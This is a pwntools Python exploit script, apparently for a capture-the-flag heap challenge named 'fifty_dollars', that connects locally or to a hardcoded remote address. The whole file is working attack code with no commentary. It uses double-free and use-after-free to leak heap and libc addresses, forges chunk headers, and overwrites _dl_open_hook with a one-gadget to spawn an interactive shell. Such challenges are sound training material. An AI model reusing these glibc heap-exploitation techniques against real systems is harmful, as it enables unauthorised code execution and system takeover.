#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./fifty_dollars"
elf=ELF(pwn_file)
heap_address=0
libc_address=0
libc=elf.libc
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.62.40.102",6001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address :0x%x"%libc_address)
    log.debug("heap address :0x%x"%heap_address)
    pause()


def add(idx,content):
    conn.sendlineafter("Your choice:","1")
    conn.sendlineafter("Index:",str(idx))
    conn.sendafter("Content:",content)

def show(idx):
    conn.sendlineafter("Your choice:","2")
    conn.sendlineafter("Index:",str(idx))
    return conn.recvuntil("Done!\n")[:-1*len("Done!\n")]

def dele(idx):
    conn.sendlineafter("Your choice:","3")
    conn.sendlineafter("Index:",str(idx))
    conn.recvuntil("Done!\n")

add(0,"a")
add(1,"a")
add(2,"a")
payload=p64(0)+p64(0x61)
add(3,payload)
f={
    0x48:p64(0x21),
}
add(4,fit(f))
add(5,p64(0)+p64(0x21))
dele(1)
dele(2)
heap_address=u64(show(2).ljust(8,"\x00"))-0x60
dele(1)
payload=p64(heap_address+0x130)
add(1,payload)
add(0,"a")
add(0,"a")
add(6,"a")
dele(3)
add(3,p64(0)+p64(0xa1))
dele(6)
libc.address=u64(show(6).ljust(8,"\x00"))-0x3c4b78
dele(3)

f={
    0x8:p64(0x401),
    0x18:p64(heap_address+0x160),
    0x38:p64(0x61),
    0x48:p64(heap_address+0x190),
}
add(3,fit(f,filler="\x00"))
dele(4)
f={
    0:p64(libc.address+0xf1147),
    0x8:p64(0x421),
    0x18:p64(heap_address+0x1c0),
    0x38:p64(0x61),
    0x48:p64(heap_address+0x200)
}
add(4,fit(f,filler="\x00"))
add(9,"a")
dele(3)
f={
    0x8:p64(0x401),
    0x18:p64(libc.symbols["_dl_open_hook"]-0x10),
    0x28:p64(libc.symbols["_dl_open_hook"]-0x20),
}
add(3,fit(f,filler="\x00"))
add(8,"a")
conn.sendlineafter("Your choice:","1")
conn.sendlineafter("Index:","1")
conn.interactive()










